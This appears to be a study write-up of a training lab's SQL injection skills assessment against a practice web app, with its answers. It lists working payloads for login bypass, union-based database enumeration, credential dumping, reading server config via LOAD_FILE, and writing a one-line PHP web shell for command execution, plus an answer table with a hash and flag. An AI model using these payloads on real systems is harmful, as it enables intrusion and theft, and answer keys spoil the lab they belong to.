## ID
537

## Module
SQL Injection Fundamentals

## Kind
lab

## Title
Skills Assessment — SQL Injection Fundamentals

## Description
Black-box penetration test of the chattr web application: bypass registration via SQLi, enumerate the database through union injection, read server config files, and achieve RCE via web shell upload.

## Tags
sqli, skills-assessment, union-injection, webshell, rce, nginx

## Commands
- ') OR 1=1-- -
- ') UNION SELECT 1,2,3,4 -- -
- ') UNION SELECT 1,2,@@version,database() -- -
- ') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
- ') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
- ') UNION SELECT 1,2,username,password from chattr.Users-- -
- ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
- ') UNION SELECT 1,2,'<?=`$_GET[0]`?>',4 into outfile '<WEBROOT>/shell.php'-- -

## What This Section Covers
Full-chain SQL injection assessment combining every technique from the module: SQLi discovery, auth bypass with OR injection, union-based enumeration of databases/tables/columns, file reading with LOAD_FILE, and file writing with INTO OUTFILE for RCE. The app uses HTTPS (requires Burp CA setup) and has parentheses in its queries, requiring `) ` before payloads.

## Methodology
1. **Recon** — Login page is not vulnerable. Register page has an `invitationCode` parameter that is injectable (single quote causes 500).
2. **Bypass registration** — Inject `') OR 1=1-- -` in the invitationCode field to bypass the invitation check. Register an account.
3. **Find second injection point** — Log in, find search at `index.php?q=search&u=1`. Single quote on `q` causes 500. `') -- -` returns 200. Confirmed injectable.
4. **Determine column count** — `') UNION SELECT 1,2,3,4 -- -` returns 200. Columns 3 and 4 are visible.
5. **Fingerprint and enumerate** — `') UNION SELECT 1,2,@@version,database() -- -` → MariaDB, database = `chattr`.
6. **List tables** — Query INFORMATION_SCHEMA.TABLES filtered by `chattr`. Find `Users` table.
7. **List columns** — Query INFORMATION_SCHEMA.COLUMNS for `Users`. Find `username` and `password`.
8. **Dump credentials** — `') UNION SELECT 1,2,username,password from chattr.Users-- -`. Get admin hash.
9. **Find web root** — Check response headers → Nginx. Read `/etc/nginx/sites-enabled/default` with LOAD_FILE. Extract the `root` path.
10. **Write web shell** — `') UNION SELECT 1,2,'<?=\`$_GET[0]\`?>',4 into outfile '<WEBROOT>/shell.php'-- -`.
11. **Get flag** — `shell.php?0=cat /*.txt`.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Password hash for admin | $argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU | Union injection: `') UNION SELECT 1,2,username,password from chattr.Users-- -` |
| Q2: Root path of web app | /var/www/chattr-prod | LOAD_FILE on `/etc/nginx/sites-enabled/default` |
| Q3: Flag from /flag_XXXXXX.txt | 061b1aeb94dec6bf5d9c27032b3c1d8d | Wrote PHP shell via INTO OUTFILE to `/var/www/chattr-prod/shell.php`, then `?0=cat /*.txt` |

## Key Takeaways
- Not every input is vulnerable — the login page was safe, the registration invitationCode and the search parameter were injectable.
- All payloads start with `')` because the backend query wraps conditions in parentheses.
- Use Burp Suite for HTTPS targets — browser can't intercept encrypted traffic otherwise.
- Nginx default config at `/etc/nginx/sites-enabled/default` reveals the web root (unlike Apache's `/var/www/html`).
- Use the shortest possible web shell (`<?=\`$_GET[0]\`?>`) to avoid URL encoding headaches.
- `cat /*.txt` is a quick way to find flags when you know the filename pattern but not the full name.

## Gotchas
- HTTPS requires Burp CA installed in the browser or using Burp's built-in Chromium — without it you can't proxy traffic.
- The invitationCode injection is in a POST body, not the URL — use Burp Repeater or intercept the request.
- INTO OUTFILE returns a 500 error even when successful — always verify by visiting the file in the browser.
- The web shell must be written to the actual Nginx web root (from Q2), not the default `/var/www/html`.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|sql-injection-fundamentals]]  
← [[16-mitigation]]
<!-- AUTO-LINKS-END -->
